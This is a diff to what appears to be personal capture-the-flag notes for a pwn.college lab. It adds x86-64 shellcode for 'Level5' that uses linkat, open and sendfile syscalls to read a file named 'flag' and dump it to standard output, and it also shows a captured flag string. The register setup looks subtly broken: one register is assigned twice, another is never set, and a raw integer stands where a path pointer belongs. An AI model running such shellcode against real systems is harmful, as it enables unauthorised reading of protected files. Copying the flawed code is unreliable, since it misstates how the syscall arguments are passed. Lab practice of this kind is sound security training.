@@ -58,5 +58,36 @@ same as level3
 pwn.college{ciRWXhSW-myeL1zVF1vVVEctUWT.0FNzIDLwIzW}
 
 ## Level5
+```
+.global _start
+.intel_syntax noprefix
+_start:
+# linkat
+	mov rdx, 0 #flag
+	lea r10, [rip+flag2] #path2
+	mov rdx, 265  #fd2
+	mov rsi, 0x67616c66 #path1
+	mov rax, 265 #fd1
+	syscall
+
+# open
+	mov rsi, 0
+	lea rdi, [rip+flag]
+	mov rax, 2 
+	syscall
+
+#sendfile
+	mov rdi, 1
+    	mov rsi, rax
+    	mov rdx, 0
+   	mov r10, 1000
+	mov rax, 40
+	syscall
+
+flag:
+	.ascii "flag\0"
+flag2:
+	.ascii "pwd/Z\0"
+```
 int linkat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, int flags);
 
